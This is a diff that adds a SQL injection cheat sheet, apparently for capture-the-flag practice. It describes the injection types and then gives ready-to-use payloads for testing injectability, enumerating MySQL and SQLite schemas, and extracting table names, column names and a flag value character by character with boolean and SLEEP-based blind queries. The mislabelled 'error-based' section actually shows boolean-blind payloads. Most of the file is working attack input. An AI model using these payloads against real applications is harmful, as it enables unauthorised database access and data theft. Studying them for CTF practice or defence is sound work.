@@ -1,0 +1,56 @@
+#--- INJECTION POINTS ---#
+- Logic-based: the attacker alters the boolean logic of the query (e.g. turning a WHERE condition into a tautology). Useful when the query itself controls a security-critical decision, such as authentication.
+- UNION-based: the attacker appends a UNION SELECT to the original query, retrieving data from other tables. Useful when the vulnerable query reads from an uninteresting table but displays its results on the page.
+- Error-based: the attacker triggers database errors that include data from the database in the error message. Useful when the application does not display query results directly but does show error messages.
+- Time-based (blind): the attacker injects conditional time delays (e.g. SLEEP()) and infers data one bit at a time by measuring response times. This is the last resort when no other output channel is available.
+  
+#--- TEST IF SQLI IS POSSIBLE ---#
+' OR 1=1 -- -
+' UNION SELECT 1,2,3 -- -
+' AND 1=2 -- -
+
+#--- PROBE VERSION, TABLE NAMES, COLUMN NAMES, COLUMN VALUES ---#
+(examples for MySQL and sqlite)
+
+#table names
+SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()
+SELECT name FROM sqlite_master WHERE type='table'
+
+#column names
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+SELECT sql FROM sqlite_master WHERE type='table' AND name='users'
+
+#column value of a table
+select flag from flags
+
+#--- ERROR BASED SQLI EXAMPLE FLOW ---#
+(example query: "SELECT name, surname FROM people WHERE id = {user_input};")
+
+1. FIND DB:
+  ' UNION select 1, version() -- -
+  
+2. FIND NUM OF TABLES:
+  1' AND ( SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() ) = 2-- -
+  
+3. GET TOTAL LENGTH OF TABLE NAMES (users, passwords, dummy):
+  1' AND LENGTH( (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) ) = 11-- -
+
+4. GET TABLE NAMES (LOOP OVER i positions, c in dictionary of possible characters):
+  1' AND SUBSTRING( (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1 ) = '{c}'-- -
+
+4. GET COLUMN NAMES FOR TABLE (LOOP OVER i positions, c in dictionary of possible characters):
+  1' AND SUBSTRING( (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='secret'),{i},1 ) = '{c}'-- -
+
+5. GET COLUMN VALUE:
+  1' AND SUBSTRING( (SELECT flag FROM flags), {i}, 1) = '{c}'-- -
+
+#--- TIME BASED SQLI EXAMPLE FLOW ---#
+same but in the form of:
+  1' AND IF( condition, {sleep}, 0)-- -
+
+where: sleep can be SLEEP(1) or (SELECT SLEEP(1) from information_schema.tables)
+
+ex:
+  1' AND IF( version() IS NOT NULL, {sleep}, 0)-- -
+
+  1' AND IF( LENGTH( (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) ) = 11, {sleep}, 0)-- -
